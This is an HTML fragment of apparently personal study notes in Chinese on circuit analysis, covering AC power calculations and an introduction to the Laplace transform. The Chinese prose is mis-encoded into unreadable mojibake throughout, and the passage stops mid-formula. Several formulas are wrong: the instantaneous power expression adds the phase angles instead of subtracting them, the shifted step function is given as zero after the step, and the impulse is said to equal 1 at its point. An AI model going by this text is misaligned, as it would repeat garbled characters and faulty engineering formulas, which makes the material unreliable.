id="9-8-èŠ‚ç‚¹ç”µå‹æ³•"><a href="#9-8-èŠ‚ç‚¹ç”µå‹æ³•" class="headerlink" title="9.8 èŠ‚ç‚¹ç”µå‹æ³•"></a>9.8 èŠ‚ç‚¹ç”µå‹æ³•</h2><h2 id="9-9-ç½‘å­”ç”µæµæ³•"><a href="#9-9-ç½‘å­”ç”µæµæ³•" class="headerlink" title="9.9 ç½‘å­”ç”µæµæ³•"></a>9.9 ç½‘å­”ç”µæµæ³•</h2><h2 id="9-10-å˜å‹å™¨"><a href="#9-10-å˜å‹å™¨" class="headerlink" title="9.10 å˜å‹å™¨"></a>9.10 å˜å‹å™¨</h2><h2 id="9-11-ç†æƒ³å˜å‹å™¨"><a href="#9-11-ç†æƒ³å˜å‹å™¨" class="headerlink" title="9.11 ç†æƒ³å˜å‹å™¨"></a>9.11 ç†æƒ³å˜å‹å™¨</h2><h2 id="9-12-ç›¸é‡å›¾"><a href="#9-12-ç›¸é‡å›¾" class="headerlink" title="9.12 ç›¸é‡å›¾"></a>9.12 ç›¸é‡å›¾</h2><h1 id="ç¬¬10ç« -æ­£å¼¦ç¨³æ€åŠŸç‡è®¡ç®—"><a href="#ç¬¬10ç« -æ­£å¼¦ç¨³æ€åŠŸç‡è®¡ç®—" class="headerlink" title="ç¬¬10ç«  æ­£å¼¦ç¨³æ€åŠŸç‡è®¡ç®—"></a>ç¬¬10ç«  æ­£å¼¦ç¨³æ€åŠŸç‡è®¡ç®—</h1><p>å‡ ä¹æ‰€æœ‰çš„ç”µèƒ½éƒ½æ˜¯ä»¥æ­£å¼¦ç”µå‹å’Œç”µæµçš„å½¢å¼ä¾›ç»™çš„.</p><p><mark>å¾…æœºåŠŸç‡</mark> , å¯èƒ½ç”¨äºè¿è¡Œä¸€ä¸ªå†…éƒ¨æ—¶é’Ÿ, ç»™ç”µæ± å……ç”µ, æ˜¾ç¤ºæ—¶é—´æˆ–å…¶ä»–å‚æ•°, ç›‘æ§æ¸©åº¦æˆ–å…¶ä»–ç¯å¢ƒæŒ‡æ ‡, æˆ–ç”¨äºæœç´¢æ¥æ”¶ä¿¡å·.</p><h2 id="10-1-ç¬æ—¶åŠŸç‡"><a href="#10-1-ç¬æ—¶åŠŸç‡" class="headerlink" title="10.1 ç¬æ—¶åŠŸç‡"></a>10.1 ç¬æ—¶åŠŸç‡</h2><p>è®¡ç®—:<br>$$<br>\displaylines{p &#x3D; vi}<br>$$</p><p>ç¬æ—¶åŠŸç‡çš„å•ä½ä¸º $W$.</p><p>åŸæœ¬:<br>$$<br>\displaylines{v &#x3D; V_m \cos (\omega t + \theta_v) \newline~ \newline<br>i &#x3D; I_m \cos (\omega t + \theta_i)}<br>$$</p><p>å·¥ç¨‹å¸ˆå‘ç°é€‰æ‹©æ­£å¼¦ç”µæµä¸ºæ­£çš„æœ€å¤§å€¼æ—¶çš„æ—¶é—´ä½œä¸ºé›¶æ—¶åˆ»æœ€ä¸ºæ–¹ä¾¿, å› æ­¤å˜ä¸º:<br>$$<br>\displaylines{v &#x3D; V_m \cos (\omega t + \theta_v - \theta_i) \newline~ \newline<br>i &#x3D; I_m \cos (\omega t)}<br>$$</p><p>æœ€ç»ˆå¾—:<br>$$<br>\displaylines{p &#x3D; V_m I_m cos (\omega t + \theta_v + \theta_i) \cos \omega t}<br>$$</p><p>åˆ©ç”¨ä¸‰è§’å˜æ¢å¾—åˆ°çš„å…¬å¼:</p><p><img src="/../img/using_regular_trans.png"></p><h2 id="10-2-å¹³å‡åŠŸç‡å’Œæ— åŠŸåŠŸç‡"><a href="#10-2-å¹³å‡åŠŸç‡å’Œæ— åŠŸåŠŸç‡" class="headerlink" title="10.2 å¹³å‡åŠŸç‡å’Œæ— åŠŸåŠŸç‡"></a>10.2 å¹³å‡åŠŸç‡å’Œæ— åŠŸåŠŸç‡</h2><p>å¹³å‡åŠŸç‡æè¿°äº†ç”µè·¯å°†ç”µèƒ½è½¬å˜ä¸ºå…¶ä»–å½¢å¼èƒ½é‡çš„åŠŸç‡, åˆè¢«ç§°ä¸º <mark>å®åŠŸç‡</mark> .</p><p>è®¡ç®—:<br>$$<br>\displaylines{P &#x3D; \frac{1}{T} \int_{t_0}^{t_0 + T} p dt \newline~ \newline<br>æœ€ç»ˆå¯å¾—: P &#x3D; \frac{V_m I_m}{2}\cos (\theta_v - \theta_i) \newline~ \newline<br>(è¿™é‡Œçš„è®¡ç®—éœ€è¦ç”¨åˆ°ä¸‰è§’å˜æ¢)<br>}<br>$$<br>(è¿™é‡Œå¯ä»¥æ€»ç»“è®¡ç®—ä¸€ä¸ªé‡çš„å¹³å‡å€¼çš„æ–¹æ³•, å°±æ˜¯å…ˆç§¯åˆ†, å†é™¤ä»¥ä¸€ä¸ªé‡)</p><p>æ— åŠŸåŠŸç‡:<br>$$<br>\displaylines{Q &#x3D; \frac{V_m I_m}{2} \sin (\theta_v - \theta_i)}<br>$$</p><h3 id="10-2-1-çº¯ç”µé˜»ç”µè·¯çš„åŠŸç‡"><a href="#10-2-1-çº¯ç”µé˜»ç”µè·¯çš„åŠŸç‡" class="headerlink" title="10.2.1 çº¯ç”µé˜»ç”µè·¯çš„åŠŸç‡"></a>10.2.1 çº¯ç”µé˜»ç”µè·¯çš„åŠŸç‡</h3><p>çº¯ç”µé˜»ç”µè·¯, ç”µå‹å’Œç”µæµåŒç›¸, $\theta_v &#x3D; \theta_i$:</p><p>$$<br>\displaylines{p &#x3D; P + P \cos 2\omega t}<br>$$</p><p>è¿™é‡Œç¬æ—¶åŠŸç‡ä¸å¯èƒ½ä¸ºè´Ÿ, èƒ½é‡ä¸è‚¯èƒ½ä»ä¸€ä¸ªçº¯ç”µé˜»ç”µè·¯è¾“å‡º, æ‰€æœ‰çš„ç”µèƒ½éƒ½ä»¥çƒ­èƒ½çš„å½¢å¼æ¶ˆè€—æ‰äº†.</p><h3 id="10-2-2-çº¯ç”µæ„Ÿç”µè·¯çš„åŠŸç‡"><a href="#10-2-2-çº¯ç”µæ„Ÿç”µè·¯çš„åŠŸç‡" class="headerlink" title="10.2.2 çº¯ç”µæ„Ÿç”µè·¯çš„åŠŸç‡"></a>10.2.2 çº¯ç”µæ„Ÿç”µè·¯çš„åŠŸç‡</h3><p>çº¯ç”µæ„Ÿç”µè·¯, ç”µå‹å’Œç”µæµçš„ç›¸ä½å·® $90^\circ$, ç”µæµæ»åç”µå‹ $90^\circ$</p><p>ç¬æ—¶åŠŸç‡è¡¨è¾¾å¼:<br>$$<br>\displaylines{p &#x3D; -Q \sin 2\omega t}<br>$$</p><p>å¹³å‡åŠŸç‡ä¸ºé›¶. (æ¯•ç«Ÿ p ä¸ºæ­£æ—¶, èƒ½é‡å­˜å‚¨äºç”µæ„Ÿå…ƒä»¶çš„ç£åœºä¸­, å½“ p ä¸º è´Ÿæ—¶, èƒ½é‡ä»ç£åœºä¸­é‡Šæ”¾)</p><p>è¿™é‡Œåªå’Œæ— åŠŸåŠŸç‡ (å•ä½ä¸º VAR, æ— åŠŸä¼å®‰)ç›¸å…³.</p><p><mark>æ— åŠŸåŠŸç‡çš„åç§°</mark> , ä¹Ÿæ˜¯æ¥è‡ªè¿™é‡Œçš„æ— åŠŸç‰¹æ€§, å³å¹³å‡åŠŸç‡ä¸ºé›¶.</p><h3 id="10-2-3-çº¯ç”µå®¹ç”µè·¯çš„åŠŸç‡"><a href="#10-2-3-çº¯ç”µå®¹ç”µè·¯çš„åŠŸç‡" class="headerlink" title="10.2.3 çº¯ç”µå®¹ç”µè·¯çš„åŠŸç‡"></a>10.2.3 çº¯ç”µå®¹ç”µè·¯çš„åŠŸç‡</h3><p>çº¯ç”µå®¹ç”µè·¯, ç”µå‹å’Œç”µæµçš„ç›¸ä½å·® $90^\circ$, ç”µæµè¶…å‰ç”µå‹ $90^\circ$.</p><p>ç¬æ—¶åŠŸç‡è¡¨è¾¾å¼:<br>$$<br>\displaylines{p &#x3D; -Q \sin 2\omega t}<br>$$</p><p>è¿™é‡Œä¹Ÿå¯çŸ¥, å¹³å‡åŠŸç‡ä¸ºé›¶. (å³æ²¡æœ‰å‘ç”Ÿç”µèƒ½ä¸å…¶ä»–å½¢å¼èƒ½é‡é—´çš„è½¬æ¢)</p><h3 id="10-2-4-åŠŸç‡å› æ•°"><a href="#10-2-4-åŠŸç‡å› æ•°" class="headerlink" title="10.2.4 åŠŸç‡å› æ•°"></a>10.2.4 åŠŸç‡å› æ•°</h3><p>åœ¨è®¡ç®—å¹³å‡åŠŸç‡å’Œæ— åŠŸåŠŸç‡æ—¶ç”¨åˆ°çš„è§’ $\theta_v - \theta_i$ ç§°ä¸º <mark>åŠŸç‡å› æ•°è§’</mark> , è¿™ä¸ªè§’çš„ä½™å¼¦å‡½æ•°ç§°ä¸º <mark>åŠŸç‡å› ç´ , pf</mark>, æ­£å¼¦å‡½æ•°ç§°ä¸º <mark>æ— åŠŸåŠŸç‡å› æ•°, rf</mark>:</p><p>å³:<br>$$<br>\displaylines{pf &#x3D; \cos (\theta_v - \theta_i) \newline~ \newline<br>rf &#x3D; \sin (\theta_v - \theta_i)}<br>$$</p><p><mark>æ»ååŠŸç‡å› æ•°</mark> è¡¨ç¤ºç”µæµæ»åç”µå‹, æ˜¯æ„Ÿæ€§è´Ÿè½½ (è¿™é‡Œçš„æ„Ÿåº”è¯¥æŒ‡ç”µæ„Ÿ)</p><p><mark>è¶…å‰åŠŸç‡å› æ•°</mark> è¡¨ç¤ºç”µæµè¶…å‰ç”µå‹, æ˜¯å®¹æ€§è´Ÿè½½ (è¿™é‡Œçš„æ„Ÿåº”è¯¥æŒ‡ç”µå®¹)</p><h2 id="10-3-å‡æ–¹æ ¹åŠåŠŸç‡è®¡ç®—"><a href="#10-3-å‡æ–¹æ ¹åŠåŠŸç‡è®¡ç®—" class="headerlink" title="10.3 å‡æ–¹æ ¹åŠåŠŸç‡è®¡ç®—"></a>10.3 å‡æ–¹æ ¹åŠåŠŸç‡è®¡ç®—</h2><p>è‹¥ç”µé˜»ä¸¤ç«¯çš„ç”µå‹ä¸ºæ­£å¼¦ç”µå‹, åˆ™, ç”µé˜» R ä¸Šçš„å¹³å‡åŠŸç‡å°±æ˜¯ç”µå‹å‡æ–¹æ ¹çš„å¹³æ–¹é™¤ä»¥ $R$:<br>$$<br>\displaylines{P &#x3D; \frac{V^2_{rms}}{R}}<br>$$</p><p>è‹¥ç”µé˜»ä¸¤ç«¯çš„ç”µæµä¸ºæ­£å¼¦ç”µæµ, åˆ™, ç”µé˜» R ä¸Šçš„å¹³å‡åŠŸç‡å°±æ˜¯ç”µå‹å‡æ–¹æ ¹çš„å¹³æ–¹ä¹˜ä»¥ $R$:<br>$$<br>\displaylines{P &#x3D; I^2_{rms}R}<br>$$</p><p><mark>å‡æ–¹æ ¹å€¼ä¹Ÿç§°ç”µå‹ (æˆ–ç”µæµ) çš„æœ‰æ•ˆå€¼</mark>, å³å¯¹äºç»™å®šçš„ç­‰æ•ˆç”µé˜»è´Ÿè½½ $R$ å’Œæ—¶é—´å‘¨æœŸ $T$, æ­£å¼¦ç”µæºä¾›ç»™ç»™ç”µé˜»çš„èƒ½é‡ç­‰äºä¸æ­£å¼¦ç”µæºå‡æ–¹æ ¹ç›¸åŒçš„ç›´æµç”µæºä¾›ç»™ç»™ç”µé˜» $R$ çš„èƒ½é‡. (ä¸¤ä¸ªç”µæºäº§ç”Ÿçš„æ•ˆæœç›¸åŒ, å› æ­¤ç§°ä¸ºæœ‰æ•ˆå€¼)</p><p>$V_{rms} &#x3D; V_{eff}$</p><h2 id="10-4-å¤åŠŸç‡"><a href="#10-4-å¤åŠŸç‡" class="headerlink" title="10.4 å¤åŠŸç‡"></a>10.4 å¤åŠŸç‡</h2><p><mark>å¤åŠŸç‡</mark> æ˜¯å¹³å‡åŠŸç‡å’Œæ— åŠŸåŠŸç‡çš„å¤æ•°å’Œ (å•ä½ä¸ºä¼å®‰ $VA$):<br>$$<br>\displaylines{S &#x3D; P + jQ}<br>$$</p><p>æœ‰ $P &#x3D; â„œ \{S\}$ (å¦ä¸€ä¸ªç¬¦å·ä¸çŸ¥é“æ˜¯ä»€ä¹ˆ)</p><p><mark>å¤åŠŸç‡çš„å‡ ä½•ç‰¹æ€§</mark> : å¯ä»¥å°† $P,\ Q\ å’Œ\ \left\vert S \right\vert$ ä½œä¸ºç›´è§’ä¸‰è§’å½¢çš„ 3 ä¸ªè¾¹:</p><p><img src="/../img/power_triangular.png"></p><p>æœ‰:<br>$$<br>\displaylines{ \frac{Q}{P} &#x3D; \frac{ \frac{V_mI_m}{2} \sin(\theta_v - \theta_i)}{ \frac{V_mI_m}{2} \cos(\theta_v - \theta_i)} &#x3D; \tan (\theta_v - \theta_i)}<br>$$</p><p>å¤åŠŸç‡çš„æ¨¡ç§°ä¸º <mark>è§†åœ¨åŠŸç‡</mark> , å³:<br>$$<br>\displaylines{ \left\vert S \right\vert &#x3D; \sqrt{P^2 + Q^2}}<br>$$</p><p>å¹³å‡åŠŸç‡è¡¨ç¤ºèƒ½é‡è½¬æ¢è®¾å¤‡çš„æœ‰ç”¨è¾“å‡º, è§†åœ¨åŠŸç‡è¡¨ç¤ºæä¾›è¿™æ ·çš„å¹³å‡åŠŸç‡éœ€è¦å¤šå¤§çš„ä¼å®‰å®¹é‡.</p><h2 id="10-5-åŠŸç‡è®¡ç®—"><a href="#10-5-åŠŸç‡è®¡ç®—" class="headerlink" title="10.5 åŠŸç‡è®¡ç®—"></a>10.5 åŠŸç‡è®¡ç®—</h2><p><img src="/../img/simplify_complex_power.png"></p><h1 id="ç¬¬12ç« -æ‹‰æ™®æ‹‰æ–¯å˜æ¢ç®€ä»‹"><a href="#ç¬¬12ç« -æ‹‰æ™®æ‹‰æ–¯å˜æ¢ç®€ä»‹" class="headerlink" title="ç¬¬12ç«  æ‹‰æ™®æ‹‰æ–¯å˜æ¢ç®€ä»‹"></a>ç¬¬12ç«  æ‹‰æ™®æ‹‰æ–¯å˜æ¢ç®€ä»‹</h1><p>æ‹‰æ™®æ‹‰æ–¯å˜æ¢, ç®€ç§°æ‹‰æ°å˜æ¢.</p><p>æ‹‰æ™®æ‹‰æ–¯å˜æ¢æŠ€æœ¯èƒ½ç”¨æ¥ç¡®å®šç”µè·¯å¯¹æ­£å¼¦ç”µæºçš„å®Œå…¨å“åº”.</p><p>ä½¿ç”¨æ‹‰æ°å˜æ¢å°†è¡¨è¾¾å¼ä»æ—¶åŸŸè½¬æ¢åˆ°é¢‘åŸŸçš„ä½œç”¨, å¯èƒ½ä¸º, ç®€åŒ–è®¡ç®—, å¹¶å¯åœ¨æœ€åæ¢ç®—å›æ—¶åŸŸ.</p><h2 id="12-1-æ‹‰æ°å˜æ¢çš„å®šä¹‰"><a href="#12-1-æ‹‰æ°å˜æ¢çš„å®šä¹‰" class="headerlink" title="12.1 æ‹‰æ°å˜æ¢çš„å®šä¹‰"></a>12.1 æ‹‰æ°å˜æ¢çš„å®šä¹‰</h2><p>å‡½æ•°æ‹‰æ°å˜æ¢å®šä¹‰ä¸º:</p><p>$$<br>\displaylines{\mathcal{L}\{f(t)\} &#x3D; \int_0^\infty f(t) e^{-st}dt<br>}<br>$$</p><p>$\mathcal{L}\{f(t)\}$ è¯»ä¸º â€œ $f(t)$ çš„æ‹‰æ°å˜æ¢â€</p><p>$f(t)$ çš„æ‹‰æ°å˜æ¢ä¹Ÿå¯è®°ä¸º $F(s)$ :<br>$$<br>\displaylines{F(s) &#x3D; \mathcal{L}\{f(t)\}}<br>$$</p><p>è¿™é‡Œçš„ $t$ ä»£è¡¨æ—¶åŸŸ, $s$ å…·æœ‰æ—¶é—´çš„å€’æ•°çš„é‡çº², å³é¢‘ç‡. (å› æ­¤, ä¼¼ä¹ s åŸŸå°±æ˜¯é¢‘åŸŸ)</p><p>æ‹‰æ°å˜æ¢å°†é—®é¢˜ <mark>ä»æ—¶åŸŸå˜æ¢åˆ°é¢‘åŸŸ</mark>. (åˆ©ç”¨é¢‘åŸŸç®—å‡ºç»“æœååˆå¯ä»¥ç”¨é€†å˜æ¢å˜å›æ—¶åŸŸ)</p><p><mark>æ•°å­¦å˜æ¢çš„ç‰¹ç‚¹</mark>: å»ºç«‹ä¸€ç§æ–°çš„åŸŸ, ç®€åŒ–æ•°å­¦è¿ç®—, å†æ‰¾åˆ°äº†æ–°åŸŸä¸­çš„æœªçŸ¥æ•°å, å†é€†å˜æ¢åˆ°åŸæ¥çš„åŸŸ. (å¦‚å¯¹æ•°å°†ä¹˜é™¤æ³•é—®é¢˜è½¬åŒ–ä¸ºåŠ å‡æ³•, $A &#x3D; BC$ å˜ä¸º $logA &#x3D; logBC &#x3D; logB + logC$, å†åå¯¹æ•°æ±‚å¾—ç»“æœ)</p><p>è¿™é‡Œçš„æ‹‰æ°å˜æ¢<mark>å•è¾¹æ‹‰æ°å˜æ¢</mark>, å› ä¸ºç§¯åˆ†ä¸‹é™ä¸º $0$, åœ¨ <mark>åŒè¾¹æ‹‰æ°å˜æ¢</mark> ä¸­, ç§¯åˆ†ä¸‹é™ä¸º $- \infty$, è¿™é‡Œä¸ä½¿ç”¨åŒè¾¹æ‹‰æ°å˜æ¢.</p><p>å°†æ‹‰æ°å˜æ¢åˆ†ä¸ºä¸¤ç§:</p><ul><li>å‡½æ•°å˜æ¢, æ˜¯ç‰¹æ®Šå‡½æ•°çš„å˜æ¢, å¦‚ $\sin \omega t,\ t,\ e^{at}\ ç­‰$</li><li>ç®—å­å˜æ¢, å®šä¹‰äº†æ‹‰æ°å˜æ¢çš„ä¸€èˆ¬æ•°å­¦ç‰¹æ€§, æ¯”å¦‚åŠ å‡ä¹˜é™¤, å¾®åˆ†, ç§¯åˆ†</li></ul><h2 id="12-2-é˜¶è·ƒå‡½æ•°"><a href="#12-2-é˜¶è·ƒå‡½æ•°" class="headerlink" title="12.2 é˜¶è·ƒå‡½æ•°"></a>12.2 é˜¶è·ƒå‡½æ•°</h2><p>å®é™…ä¸­, å¯èƒ½ä¼šé‡åˆ°åœ¨åŸç‚¹ä¸è¿ç»­çš„æˆ–æœ‰è·³å˜çš„å‡½æ•°. å¯ä»¥ç”¨é˜¶è·ƒæˆ–å†²æ¿€å‡½æ•°æ¥è¡¨è¾¾è¿™ç§ä¸è¿ç»­æ€§.</p><p><mark>é˜¶è·ƒå‡½æ•°</mark> , å½“ $t &lt; 0$ æ—¶, å…¶å€¼ä¸ºé›¶, å½“ $t &gt; 0$ æ—¶, å…¶å€¼ä¸º $K$. ç”¨ $Ku(t)$ è¡¨ç¤º, æ•°å­¦å®šä¹‰ä¸º:<br>$$<br>\displaylines{Ku(t) &#x3D; 0, t &lt; 0 \newline~ \newline<br>Ku(t) &#x3D; k, t &gt; 0}<br>$$</p><p>è‹¥ $K &#x3D; 1$, åˆ™ä¸º <mark>å•ä½é˜¶è·ƒå‡½æ•°</mark> </p><p>é˜¶è·ƒå‡½æ•°åœ¨ $t &#x3D; 0$ æ—¶æ— å®šä¹‰, å½“éœ€è¦å®šä¹‰ $0^{-}$ ä¸ $0^{+}$ ä¹‹é—´çš„è¿‡æ¸¡è¿‡ç¨‹æ—¶, å°±å‡è®¾å‡½æ•°æ˜¯çº¿æ€§çš„, ä¸”:<br>$$<br>\displaylines{Ku(0) &#x3D; 0.5K}<br>$$</p><p><img src="/../img/step_function_and_linear_approximation.png"></p><p>(é˜¶è·ƒ, å¯èƒ½å°±æ˜¯è¿™é‡Œä» 0 å˜åŒ–åˆ° $K$)</p><p>ä¸è¿ç»­ç‚¹ä¹Ÿå¯èƒ½å‡ºç°åœ¨ $t$ ä¸ç­‰äºé›¶çš„å…¶ä»–ç‚¹:<br>$$<br>\displaylines{Ku(t - a) &#x3D; 0,\ t &lt; a \newline~ \newline<br>Ku(t - a) &#x3D; 0,\ t &gt; a}<br>$$</p><p><img src="/../img/step_function_t_and_a.png"></p><p>éœ€è¦çŸ¥é“<mark>ä¸€ä¸ªè®°æ³•</mark>:<br>$$<br>\displaylines{K[u(t-1)-u(t-3)]}<br>$$</p><p>è¡¨æ˜åœ¨ $1&lt;t&lt;3$ æ—¶å…¶å€¼ä¸º K, åœ¨å…¶ä»–å¤„å…¶å€¼ä¸º 0.</p><p>ç¤ºä¾‹:</p><blockquote><p>ç”¨é˜¶è·ƒæ–¹ç¨‹è¡¨ç¤ºå¦‚å›¾å‡½æ•°</p></blockquote><p><img src="/../img/example_of_step_function.png"></p><p>ç»“æœä¸º:<br>$$<br>\displaylines{f(t) &#x3D; 2t[u(t) - u(t-1)] + (-2t + 4)[u(t-1) - u(t-3)] + (2t-8)[u(t-3)-u(t-4)]}<br>$$</p><p>å«ä¹‰ä¸º, $0&lt;t&lt;1$ æ—¶, å…¶å€¼ä¸º $2t$, $1&lt;t&lt;3$</p><h2 id="12-3-å†²æ¿€å‡½æ•°"><a href="#12-3-å†²æ¿€å‡½æ•°" class="headerlink" title="12.3 å†²æ¿€å‡½æ•°"></a>12.3 å†²æ¿€å‡½æ•°</h2><p><mark>å†²æ¿€</mark> æ˜¯å…·æœ‰æ— ç©·å¤§çš„å¹…å€¼è€ŒæŒç»­æ—¶é—´ä¸ºé›¶çš„ä¿¡å·, è‡ªç„¶ç•Œä¸­å¹¶ä¸å­˜åœ¨è¿™ç§ä¿¡å·, ä½†ä¸€äº›ç”µè·¯ä¸­çš„ä¿¡å·ä¸è¿™ç§å®šä¹‰éå¸¸æ¥è¿‘.</p><p><mark>å†²æ¿€å‡½æ•°æ˜¯ä¸ºäº†è§£å†³</mark> å‡½æ•°çš„å¯¼æ•°åœ¨é—´çŸ­ç‚¹å¤„æ²¡æœ‰å®šä¹‰çš„æƒ…å†µ.</p><p>å†²æ¿€å‡½æ•°æ˜¯ç”±å¯å˜å‚æ•°ä¸­çš„å‚æ•°è¶‹äº 0 æ—¶å½¢æˆçš„, å½“å‚æ•°è¶‹äº 0 æ—¶, å¯å˜å‚æ•°å‡½æ•°è¡¨ç°å‡ºä»¥ä¸‹ä¸‰ä¸ªç‰¹æ€§:</p><ol><li>å¹…å€¼è¶‹äºæ— ç©·å¤§</li><li>å‡½æ•°çš„æŒç»­æ—¶é—´è¶‹äº 0</li><li>å½“å‚æ•°å˜åŒ–æ—¶, å‡½æ•°ä¸‹çš„é¢ç§¯ä¸ºå¸¸æ•° (è¯¥é¢ç§¯è¡¨ç¤º <mark>å†²æ¿€å¼ºåº¦</mark> )</li></ol><p>è‹¥ä¸€ä¸ªæ›²çº¿çš„é¢ç§¯ä¸ºå¸¸æ•° K, å› æ­¤, $\epsilon \rightarrow 0$ æ—¶, $f(t) \rightarrow K \delta (t)$ ( $\delta (t)$ è¡¨ç¤ºå•ä½å†²æ¿€å‡½æ•°, é¢ç§¯å€¼ä¸º 1)</p><p>æ•°å­¦ä¸Š, å†²æ¿€å‡½æ•°çš„å®šä¹‰ä¸º:<br>$$<br>\displaylines{\int_{-\infty}^{+\infty} K \delta(t)dt &#x3D; K \newline~ \newline<br>\delta (t) &#x3D; 0, t \ne 0}<br>$$<br>(æ¡ä»¶è¡¨æ˜, é™¤äº† $t &#x3D; 0$ ä»¥å¤–, å†²æ¿€å‡½æ•°å€¼éƒ½ä¸º 0)</p><p>å¦‚:<br><img src="/../img/impulse_function_pic.png"></p><p>ç¬¬äºŒå¹…å›¾ä¸­çš„ $-\epsilon \sim \epsilon$ èŒƒå›´çš„å‡½æ•°å°±æ˜¯å†²æ¿€å‡½æ•°.</p><p>å†²æ¿€å‡½æ•°çš„æ³¢å½¢ç¬¦å·ä¸ºä¸€ç®­å¤´, å†²æ¿€çš„å¼ºåº¦ç”¨é è¿‘ç®­å¤´çš„æ•°å€¼ç»™å‡º, å¦‚:</p><p>å†²æ¿€å‡½æ•°çš„å¦ä¸€ä¸ªé‡è¦ç‰¹æ€§å°±æ˜¯ <mark>ç­›é€‰ç‰¹æ€§</mark> :<br>$$<br>\displaylines{\int_{-\infty}^{+\infty} f(t) \delta (t-a)dt &#x3D; f(a)}<br>$$<br>å‡½æ•° $f(t)$ åœ¨ $t&#x3D;a$ å¤„å‡è®¾ä¸ºè¿ç»­çš„. è¿™é‡Œå°±ç­›æ‰äº† $t&#x3D;a$ ä»¥å¤–çš„æ‰€æœ‰ $f(t)$ çš„å€¼.</p><p>(æ¯•ç«Ÿ, å½“ $t &#x3D; 1$ æ—¶, $\delta(t-a)$ çš„å€¼ä¸º 1, è€Œ $t \ne a$ æ—¶, $\delta(t-a)$ çš„å€¼ä¸º 0)</p><p>åˆ©ç”¨å†²æ¿€å‡½æ•°çš„ç­›é€‰ç‰¹æ€§æ±‚å‡ºå…¶æ‹‰æ°å˜æ¢ (å³æ±‚å†²æ¿€å‡½æ•°çš„æ‹‰æ°å˜æ¢):<br>$$<br>\displaylines{\mathcal{L}\{\delta (t)\} e^{-st}dt &#x3D; \int_{0^{-}}^\infty \delta(t) e^{-st}dt &#x3D; \int_{0^{-}}^\infty \delta(t)dt &#x3D; 1<br>}<br>$$</p><p>(è¿™é‡Œå€¼ä¸º 1 ä¹Ÿæ˜¯åŒæ ·çš„é“ç†: å½“ $t &#x3D; 0$ æ—¶, $\delta(t)$ çš„å€¼ä¸º 1, è€Œ $t \ne 0$ æ—¶, $\delta(t)$ çš„å€¼ä¸º 0)</p><p>ä¸¤ä¸ªæœ‰åŠ©äºç†è§£çš„å›¾:</p><p><img src="/../img/first_order_impulse_function_and_its_differential.png"></p><p>(å‰è€…åˆ©ç”¨äº†å°†æœªå®šä¹‰éƒ¨åˆ†çº¿æ€§åŒ–çš„è®¾å®š, è¿™é‡Œ $\epsilon \rightarrow 0$  æ—¶, $\frac{1}{\epsilon} \rightarrow \infty$ )</p><p>å‡ ä¸ªæ¨å¯¼å‡ºçš„ç»“è®º (è¿‡ç¨‹å¯ä»¥è§ä¹¦):</p><blockquote><p>æ±‚ $\delta^\prime (t)$ çš„æ‹‰æ°å˜æ¢</p></blockquote><p>$$<br>\displaylines{\mathcal{L}\{\delta^\prime (t)\} &#x3D; s}<br>$$</p><blockquote><p>æ¨å¹¿:</p></blockquote><p>$$<br>\displaylines{\mathcal{L}\{\delta^{(n)} (t)\} &#x3D; s^n}<br>$$</p><blockquote><p>å†²æ¿€å‡½æ•°å¯çœ‹æˆæ˜¯é˜¶è·ƒå‡½æ•°çš„å¯¼æ•°:</p></blockquote><p>$$<br>\displaylines{\delta (t) &#x3D; \frac{du(t)}{dt}}<br>$$</p><p>åŸå› è§ä¹¦</p><h2 id="12-4-å‡½æ•°å˜æ¢"><a href="#12-4-å‡½æ•°å˜æ¢" class="headerlink" title="12.4 å‡½æ•°å˜æ¢"></a>12.4 å‡½æ•°å˜æ¢</h2><p>å•ä½é˜¶è·ƒå‡½æ•°, å³:</p><p><img src="/../img/unit_step_function.png"></p><p>ç‰¹ç‚¹å°±æ˜¯, $t &lt; 0$ æ—¶, å‡½æ•°å€¼ä¸º 0, $t &gt; 0$ æ—¶, å‡½æ•°å€¼ä¸º 1.</p><p>å› æ­¤, å•ä½é˜¶è·ƒå‡½æ•°çš„æ‹‰æ°å˜æ¢ä¸º:<br>$$<br>\displaylines{\mathcal{L}\{u(t)\} &#x3D; \int_{0^{-}}^{\infty} f(t) e^{-st} dt &#x3D; \int_{0^{+}}^{\infty} 1 e^{-st} dt &#x3D; \frac{e^{-st}}{-s} \vert_{0^{+}}^{\infty} &#x3D; \frac{1}{s}}<br>$$</p><p>å¸¸è§å‡½æ•°çš„æ‹‰æ°å˜æ¢å€¼:</p><p><img src="/../img/Larred_transform_table.png"></p><h2 id="12-5-ç®—å­å˜æ¢"><a href="#12-5-ç®—å­å˜æ¢" class="headerlink" title="12.5 ç®—å­å˜æ¢"></a>12.5 ç®—å­å˜æ¢</h2><h3 id="12-5-1-ä¹˜ä»¥å¸¸æ•°"><a href="#12-5-1-ä¹˜ä»¥å¸¸æ•°" class="headerlink" title="12.5.1 ä¹˜ä»¥å¸¸æ•°"></a>12.5.1 ä¹˜ä»¥å¸¸æ•°</h3><p>è‹¥:<br>$$<br>\displaylines{\mathcal{L}\{f(t)\} &#x3D; F(s)}<br>$$</p><p>åˆ™:<br>$$<br>\displaylines{\mathcal{L}\{Kf(t)\} &#x3D; KF(s)}<br>$$</p><h3 id="12-5-2-åŠ -å‡-è¿ç®—ç‰¹æ€§"><a href="#12-5-2-åŠ -å‡-è¿ç®—ç‰¹æ€§" class="headerlink" title="12.5.2 åŠ  (å‡) è¿ç®—ç‰¹æ€§"></a>12.5.2 åŠ  (å‡) è¿ç®—ç‰¹æ€§</h3><p>æ—¶åŸŸçš„åŠ  (å‡) å¯¹åº”äºé¢‘åŸŸçš„åŠ  (å‡), è‹¥:<br>$$<br>\displaylines{\mathcal{L}\{f_1(t)\} &#x3D; F_1(s) \newline~ \newline<br>\mathcal{L}\{f_2(t)\} &#x3D; F_2(s) \newline~ \newline<br>\mathcal{L}\{f_3(t)\} &#x3D; F_3(s)}<br>$$</p><p>åˆ™:<br>$$<br>\displaylines{\mathcal{L}\{f_1(t) + f_2(t) + f_3(t)\} &#x3D; F_1(s) + F_2(s) + F_3(s)}<br>$$</p><h3 id="12-5-3-å¾®åˆ†"><a href="#12-5-3-å¾®åˆ†" class="headerlink" title="12.5.3 å¾®åˆ†"></a>12.5.3 å¾®åˆ†</h3><p>æ—¶åŸŸçš„å¾®åˆ†å¯åŒ–ä¸º s åŸŸçš„ä»£æ•°è¿ç®—.</p><p>$$<br>\displaylines{\mathcal{L}\{ \frac{df(t)}{dt}\} &#x3D; sF(s) - f(0^{-})<br>}<br>$$</p><p>æˆ–ç›´æ¥:<br>$$<br>\displaylines{\mathcal{L}\{ \frac{df(t)}{dt}\} &#x3D; \int_{0^{-}}^{\infty} [ \frac{df(t)}{dt}] 